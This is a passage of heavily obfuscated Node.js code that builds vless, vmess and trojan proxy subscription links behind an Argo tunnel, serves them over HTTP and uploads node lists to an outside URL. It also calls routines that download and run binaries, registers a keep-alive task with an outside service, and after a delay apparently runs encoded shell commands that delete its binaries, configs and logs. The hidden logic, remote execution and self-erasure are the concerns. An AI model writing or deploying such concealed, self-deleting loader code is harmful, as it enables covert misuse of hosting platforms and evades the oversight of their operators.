_0x274ac7(),_0x3415b9=NAME?NAME+'-'+_0x47052e:_0x47052e;return new Promise(_0x43ab67=>{const _0x23b617={_0x77cbd:0x17b,_0x3753b1:0x165,_0x759816:0x1f6,_0x1dbc2b:0x148,_0x1ebf0c:0x167,_0x33f591:0x193,_0x4b9f8f:0x1a6,_0x2d7771:0x1d9,_0x153d8b:0x134,_0x9d382a:0x1b0,_0x363bfa:0x1dc,_0x3c8f47:0x17f};setTimeout(()=>{const _0x4310b2={_0x25dbcb:0x154},_0x4e64c9=_0x3bbd,_0x38b40e={'v':'2','ps':''+_0x3415b9,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x4e64c9(0x17b),'net':'ws','type':_0x4e64c9(_0x23b617._0x77cbd),'host':_0x37f750,'path':'/vmess-argo?ed=2560','tls':_0x4e64c9(_0x23b617._0x3753b1),'sni':_0x37f750,'alpn':'','fp':_0x4e64c9(0x1bc)},_0x5f3f41='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x4e64c9(_0x23b617._0x759816)+_0x37f750+_0x4e64c9(0x13a)+_0x37f750+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3415b9+_0x4e64c9(_0x23b617._0x1dbc2b)+Buffer['from'](JSON[_0x4e64c9(_0x23b617._0x1ebf0c)](_0x38b40e))['toString']('base64')+_0x4e64c9(_0x23b617._0x33f591)+UUID+'@'+CFIP+':'+CFPORT+_0x4e64c9(_0x23b617._0x4b9f8f)+_0x37f750+'&fp=firefox&type=ws&host='+_0x37f750+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x3415b9+_0x4e64c9(0x160);console['log'](Buffer[_0x4e64c9(0x1dc)](_0x5f3f41)[_0x4e64c9(_0x23b617._0x2d7771)](_0x4e64c9(_0x23b617._0x153d8b))),fs[_0x4e64c9(_0x23b617._0x9d382a)](subPath,Buffer[_0x4e64c9(_0x23b617._0x363bfa)](_0x5f3f41)[_0x4e64c9(0x1d9)](_0x4e64c9(_0x23b617._0x153d8b))),console['log'](FILE_PATH+_0x4e64c9(_0x23b617._0x3c8f47)),uploadNodes(),app['get']('/'+SUB_PATH,(_0x1a9a8b,_0x4c8383)=>{const _0x40da75=_0x4e64c9,_0x5b5492=Buffer[_0x40da75(0x1dc)](_0x5f3f41)['toString']('base64');_0x4c8383[_0x40da75(0x1c8)]('Content-Type',_0x40da75(0x15e)),_0x4c8383[_0x40da75(_0x4310b2._0x25dbcb)](_0x5b5492);}),_0x43ab67(_0x5f3f41);},0x7d0);});}}async function uploadNodes(){const _0x56d389={_0x27c174:0x1d4,_0x4a8a5a:0x1ca,_0x317725:0x1ab,_0x364cc3:0x1dd,_0x3f68dd:0x1bf,_0x1d2927:0x183,_0x2e4a51:0x1a7,_0x3f5bb2:0x167,_0x68f394:0x175,_0x437cb3:0x1df},_0xe86ba3=_0x4c27fa;if(UPLOAD_URL&&PROJECT_URL){const _0x1e103c=PROJECT_URL+'/'+SUB_PATH,_0x3a3b11={'subscription':[_0x1e103c]};try{const _0xd191ed=await axios[_0xe86ba3(_0x56d389._0x27c174)](UPLOAD_URL+_0xe86ba3(0x196),_0x3a3b11,{'headers':{'Content-Type':_0xe86ba3(0x175)}});return _0xd191ed&&_0xd191ed[_0xe86ba3(0x1df)]===0xc8?(console[_0xe86ba3(_0x56d389._0x4a8a5a)](_0xe86ba3(0x1f0)),_0xd191ed):null;}catch(_0x11db20){if(_0x11db20['response']){if(_0x11db20[_0xe86ba3(_0x56d389._0x317725)][_0xe86ba3(0x1df)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0xe86ba3(_0x56d389._0x364cc3)](listPath))return;const _0x470122=fs[_0xe86ba3(_0x56d389._0x3f68dd)](listPath,_0xe86ba3(_0x56d389._0x1d2927)),_0x41d3a5=_0x470122[_0xe86ba3(0x1cf)]('\x0a')['filter'](_0x1031ce=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0xe86ba3(0x19a)](_0x1031ce));if(_0x41d3a5[_0xe86ba3(_0x56d389._0x2e4a51)]===0x0)return;const _0x3ab294=JSON[_0xe86ba3(_0x56d389._0x3f5bb2)]({'nodes':_0x41d3a5});try{const _0xeeccba=await axios[_0xe86ba3(0x1d4)](UPLOAD_URL+_0xe86ba3(0x1b5),_0x3ab294,{'headers':{'Content-Type':_0xe86ba3(_0x56d389._0x68f394)}});return _0xeeccba&&_0xeeccba[_0xe86ba3(_0x56d389._0x437cb3)]===0xc8?(console[_0xe86ba3(0x1ca)]('Nodes\x20uploaded\x20successfully'),_0xeeccba):null;}catch(_0xf564e5){return null;}}else return;}}function cleanFiles(){const _0x2d632c={_0x458912:0x1d5,_0x2b5ee5:0x16a,_0x9cbefa:0x15c},_0x2570bb={_0x451316:0x1ca,_0x5cfc2a:0x170},_0x2a872a={_0x3b71f3:0x1b8};setTimeout(()=>{const _0x16bb3d=_0x3bbd,_0x3931e8=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x3931e8['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x3931e8['push'](phpPath);process['platform']===_0x16bb3d(_0x2d632c._0x458912)?exec(_0x16bb3d(_0x2d632c._0x2b5ee5)+_0x3931e8['join']('\x20')+_0x16bb3d(_0x2d632c._0x9cbefa),_0x25c49c=>{const _0x321004=_0x16bb3d;console[_0x321004(0x17d)](),console[_0x321004(0x1ca)](_0x321004(_0x2a872a._0x3b71f3)),console[_0x321004(0x1ca)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec(_0x16bb3d(0x1b2)+_0x3931e8[_0x16bb3d(0x14e)]('\x20')+_0x16bb3d(0x173),_0x542e84=>{const _0x509a20=_0x16bb3d;console[_0x509a20(0x17d)](),console[_0x509a20(0x1ca)](_0x509a20(0x1b8)),console[_0x509a20(_0x2570bb._0x451316)](_0x509a20(_0x2570bb._0x5cfc2a));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x264399={_0x382fec:0x1ca,_0x543ab0:0x1a9,_0x325906:0x175,_0x4bf474:0x171},_0x439371=_0x4c27fa;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x439371(_0x264399._0x382fec)](_0x439371(_0x264399._0x543ab0));return;}try{const _0x40188e=await axios[_0x439371(0x1d4)](_0x439371(0x1eb),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x439371(_0x264399._0x325906)}});return console[_0x439371(_0x264399._0x382fec)](_0x439371(0x1a2)),_0x40188e;}catch(_0x116f83){return console[_0x439371(_0x264399._0x4bf474)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x116f83[_0x439371(0x1e3)]),null;}}async function startserver(){const _0x19d082=_0x4c27fa;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x80879b){console[_0x19d082(0x171)](_0x19d082(0x195),_0x80879b);}}function _0x3bbd(_0x59196d,_0x39bb8d){const _0x5abdc4=_0x5abd();return _0x3bbd=function(_0x3bbdd2,_0x5420b0){_0x3bbdd2=_0x3bbdd2-0x134;let _0x2e65f8=_0x5abdc4[_0x3bbdd2];return _0x2e65f8;},_0x3bbd(_0x59196d,_0x39bb8d);}startserver()[_0x4c27fa(0x1ce)](_0x497acc=>{const _0x467797={_0x5ae85b:0x1a4},_0x253d0f=_0x4c27fa;console[_0x253d0f(0x171)](_0x253d0f(_0x467797._0x5ae85b),_0x497acc);}),app['listen'](PORT,()=>console[_0x4c27fa(0x1ca)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
